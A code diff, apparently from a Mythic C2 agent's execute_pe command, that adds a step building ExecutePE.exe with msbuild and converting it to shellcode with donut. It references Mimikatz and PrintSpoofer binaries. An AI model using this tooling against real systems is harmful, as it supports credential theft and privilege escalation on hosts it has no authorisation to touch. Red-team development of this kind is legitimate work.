@@ -1,3 +1,6 @@
+from shutil import copytree
+import shutil
+import tempfile
 from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
@@ -9,6 +12,8 @@ import donut
 
 PRINTSPOOFER_FILE_ID = ""
 MIMIKATZ_FILE_ID = ""
+
+EXECUTE_PE_PATH = "/srv/ExecutePE.exe"
 
 PE_VARNAME = "pe_id"
 
@@ -83,13 +88,27 @@ class ExecutePECommand(CommandBase):
     argument_class = ExecutePEArguments
     attackmapping = ["T1547"]
 
+
+    async def build_exepe(self):
+        global EXECUTE_PE_PATH
+        agent_build_path = tempfile.TemporaryDirectory()
+        outputPath = "{}/ExecutePE/bin/Release/ExecutePE.exe".format(agent_build_path.name)
+        copytree(self.agent_code_path, agent_build_path.name)
+        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/ExecutePE/ExecutePE.csproj".format(agent_build_path.name)
+        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
+                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
+        stdout, stderr = await proc.communicate()
+        if not path.exists(outputPath):
+            raise Exception("Failed to build ExecutePE.exe:\n{}".format(stderr.decode()))
+        shutil.copy(outputPath, EXECUTE_PE_PATH)
+
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         global MIMIKATZ_FILE_ID
         global PRINTSPOOFER_FILE_ID
         global PE_VARNAME
+        global EXECUTE_PE_PATH
 
         task.args.add_arg("pipe_name", str(uuid4()))
-        exePath = "/srv/ExecutePE.exe"
         mimikatz_path = "/Mythic/agent_code/mimikatz_x64.exe"
         printspoofer_path = "/Mythic/agent_code/PrintSpoofer_x64.exe"
         shellcode_path = "/tmp/loader.bin"
@@ -102,7 +121,10 @@ class ExecutePECommand(CommandBase):
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
         stdout, stderr = await proc.communicate()
         
-        command = "{} -f 1 {} -p \"{}\"".format(donutPath, exePath, task.args.get_arg("pipe_name"))
+        if not path.exists(EXECUTE_PE_PATH):
+            await self.build_exepe()
+
+        command = "{} -f 1 {} -p \"{}\"".format(donutPath, EXECUTE_PE_PATH, task.args.get_arg("pipe_name"))
         # need to go through one more step to turn our exe into shellcode
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                         stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
